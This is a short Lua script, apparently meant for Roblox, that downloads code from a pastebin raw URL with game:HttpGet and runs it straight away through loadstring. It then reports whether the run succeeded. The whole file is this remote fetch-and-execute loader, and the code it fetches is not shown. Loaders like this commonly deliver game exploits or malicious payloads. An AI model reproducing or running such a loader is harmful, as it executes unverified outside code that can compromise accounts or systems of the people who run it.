local success, result = pcall(function()
    return loadstring(game:HttpGet("https://pastebin.com/raw/STVgtCUS"))()
end)

if success then
    print("Script executed successfully.")
else
    warn("Execution failed: " .. tostring(result))
end
